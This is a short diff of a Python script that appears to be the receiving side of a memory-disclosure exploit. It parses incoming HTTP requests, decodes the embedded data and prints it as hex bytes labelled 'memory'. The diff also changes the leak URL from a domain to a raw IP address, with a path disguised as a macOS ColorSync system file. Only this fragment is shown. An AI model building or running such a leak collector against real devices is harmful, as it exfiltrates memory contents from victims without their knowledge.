@@ -28,12 +28,12 @@ def listen():
                     end = data.find("HTTP")
                     str1 = data[start+4 :end-1]
                     l = str1.decode('utf-8').encode('utf-16le')
-                    print ("memory") + str(len(l[65*2:])) + ("bytes")
+                    print ("memory" + str(len(l[65*2:])) + "bytes")
                     for i in l[65*2:]:
-                        print (hex)(ord(i)),
+                        print (hex(ord(i))),
                     print ("")
                     print (l[65*2:])
-                u = "http://natashenka.party//System/Library/ColorSync/Resources/ColorTables.data?val=a123456"
+                u = "http://157.230.241.64//System/Library/ColorSync/Resources/ColorTables.data?val=a123456"
                 w = ""
                 for item in u:
                     w = w +item
